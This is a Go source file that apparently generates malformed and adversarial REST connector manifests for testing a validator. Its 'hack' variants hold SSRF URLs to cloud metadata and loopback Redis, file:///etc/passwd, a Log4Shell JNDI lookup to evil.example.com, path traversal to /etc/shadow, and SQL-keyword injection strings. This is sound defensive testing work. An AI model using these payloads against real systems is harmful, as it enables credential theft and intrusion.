package generator

import (
	"fmt"
	"strings"
)

type restManifestFields struct {
	name      string
	baseURL   string
	authKind  string // "" omits the auth block entirely
	tokenEnv  string // "" omits token_env (attack: bearer without token)
	endpoints []restEndpoint
}

type restEndpoint struct {
	id             string
	path           string
	method         string
	paginationKind string // "" omits pagination block
	pageParam      string // "" omits page_param line
	limit          string // "" omits limit; raw token allows 0/-1
	cursorPath     string // "" omits cursor_path
	hasMorePath    string // "" omits has_more_path
	responsePath   string // "" omits response_path
}

type restVariant struct {
	name     string
	field    string
	payloads []string
	mutate   func(m *restManifestFields, payload string)
}

func restBaseline(seed int64) restManifestFields {
	return restManifestFields{
		name:     fmt.Sprintf("otk-rest-%d", seed),
		baseURL:  "https://api.example.com",
		authKind: "bearer",
		tokenEnv: "OTK_REST_TOKEN",
		endpoints: []restEndpoint{{
			id:             "items",
			path:           "/v1/items",
			method:         "GET",
			paginationKind: "page",
			pageParam:      "page",
			limit:          "50",
			hasMorePath:    "$.has_more",
			responsePath:   "$.data",
		}},
	}
}

func renderRest(m restManifestFields) string {
	var b strings.Builder
	fmt.Fprintf(&b, "apiVersion: connectors.lumnik.io/v1\n")
	fmt.Fprintf(&b, "kind: Connector\n")
	fmt.Fprintf(&b, "metadata:\n")
	fmt.Fprintf(&b, "  name: %q\n", m.name)
	fmt.Fprintf(&b, "  connector_type: rest-generic\n")
	fmt.Fprintf(&b, "  scopes: [\"otk\"]\n")
	fmt.Fprintf(&b, "spec:\n")
	fmt.Fprintf(&b, "  base_url: %q\n", m.baseURL)
	if m.authKind != "" {
		fmt.Fprintf(&b, "  auth:\n")
		fmt.Fprintf(&b, "    kind: %q\n", m.authKind)
		if m.tokenEnv != "" {
			fmt.Fprintf(&b, "    token_env: %q\n", m.tokenEnv)
		}
	}
	if len(m.endpoints) == 0 {
		fmt.Fprintf(&b, "  endpoints: []\n")
	} else {
		fmt.Fprintf(&b, "  endpoints:\n")
		for _, ep := range m.endpoints {
			fmt.Fprintf(&b, "    - id: %q\n", ep.id)
			fmt.Fprintf(&b, "      path: %q\n", ep.path)
			fmt.Fprintf(&b, "      method: %q\n", ep.method)
			if ep.paginationKind != "" {
				fmt.Fprintf(&b, "      pagination:\n")
				fmt.Fprintf(&b, "        kind: %q\n", ep.paginationKind)
				if ep.pageParam != "" {
					fmt.Fprintf(&b, "        page_param: %q\n", ep.pageParam)
				}
				if ep.limit != "" {
					fmt.Fprintf(&b, "        limit: %s\n", ep.limit)
				}
				if ep.cursorPath != "" {
					fmt.Fprintf(&b, "        cursor_path: %q\n", ep.cursorPath)
				}
				if ep.hasMorePath != "" {
					fmt.Fprintf(&b, "        has_more_path: %q\n", ep.hasMorePath)
				}
				if ep.responsePath != "" {
					fmt.Fprintf(&b, "        response_path: %q\n", ep.responsePath)
				}
			}
		}
	}
	return b.String()
}

// restVariantsByCategory uses the same category order as categories (catalog.go)
// so seed→category distribution is identical for CSV and REST lanes.
var restVariantsByCategory = map[string][]restVariant{
	"logical": {
		{name: "bearer-no-token-env", field: "spec.auth.token_env", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) { m.tokenEnv = "" }},
		{name: "cursor-no-path", field: "spec.endpoints[].pagination", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) {
				ep := &m.endpoints[0]
				ep.paginationKind = "cursor"
				ep.pageParam = ""
				ep.limit = ""
				ep.hasMorePath = "$.has_more"
				ep.responsePath = "$.data"
				// cursorPath intentionally absent — the attack
			}},
		{name: "page-no-param", field: "spec.endpoints[].pagination.page_param", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) { m.endpoints[0].pageParam = "" }},
		{name: "no-endpoints", field: "spec.endpoints", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) { m.endpoints = nil }},
		{name: "method-delete", field: "spec.endpoints[].method", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) { m.endpoints[0].method = "DELETE" }},
	},
	"weird": {
		{name: "empty-base-url", field: "spec.base_url", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) { m.baseURL = "" }},
		{name: "huge-base-url", field: "spec.base_url", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) { m.baseURL = strings.Repeat("A", 100000) }},
		{name: "empty-endpoint-path", field: "spec.endpoints[].path", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) { m.endpoints[0].path = "" }},
		{name: "zero-limit", field: "spec.endpoints[].pagination.limit", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) { m.endpoints[0].limit = "0" }},
		{name: "duplicate-endpoint-ids", field: "spec.endpoints[].id", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) {
				m.endpoints = append(m.endpoints, m.endpoints[0])
			}},
	},
	"textual": {
		{name: "bidi-in-base-url", field: "spec.base_url", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) {
				m.baseURL = "https://api\u202e.example.com"
			}},
		{name: "sql-keyword-endpoint-id", field: "spec.endpoints[].id",
			payloads: []string{"drop table", "select", "; delete"},
			mutate:   func(m *restManifestFields, p string) { m.endpoints[0].id = p }},
		{name: "long-endpoint-id", field: "spec.endpoints[].id", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) {
				m.endpoints[0].id = strings.Repeat("e", 5000)
			}},
		{name: "null-byte-base-url", field: "spec.base_url", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) {
				m.baseURL = "https://api\x00.example.com"
			}},
		{name: "confusable-name", field: "metadata.name", payloads: []string{""},
			mutate: func(m *restManifestFields, _ string) {
				m.name = "otk-rest-\u0430dv" // Cyrillic а (U+0430) lookalike for ASCII a
			}},
	},
	"hack": {
		{name: "ssrf-internal-ip", field: "spec.base_url",
			payloads: []string{"http://169.254.169.254/latest/meta-data/"},
			mutate:   func(m *restManifestFields, p string) { m.baseURL = p }},
		{name: "ssrf-loopback", field: "spec.base_url",
			payloads: []string{"http://127.0.0.1:6379/"},
			mutate:   func(m *restManifestFields, p string) { m.baseURL = p }},
		{name: "file-scheme", field: "spec.base_url",
			payloads: []string{"file:///etc/passwd"},
			mutate:   func(m *restManifestFields, p string) { m.baseURL = p }},
		{name: "jndi-base-url", field: "spec.base_url",
			payloads: []string{"${jndi:ldap://evil.example.com/x}"},
			mutate:   func(m *restManifestFields, p string) { m.baseURL = p }},
		{name: "path-traversal-endpoint", field: "spec.endpoints[].path",
			payloads: []string{"/../../../etc/shadow", "../../etc/passwd"},
			mutate:   func(m *restManifestFields, p string) { m.endpoints[0].path = p }},
		{name: "token-env-sentinel", field: "spec.auth.token_env",
			payloads: []string{"OTK_SENTINEL_SECRET"},
			mutate:   func(m *restManifestFields, p string) { m.tokenEnv = p }},
	},
}
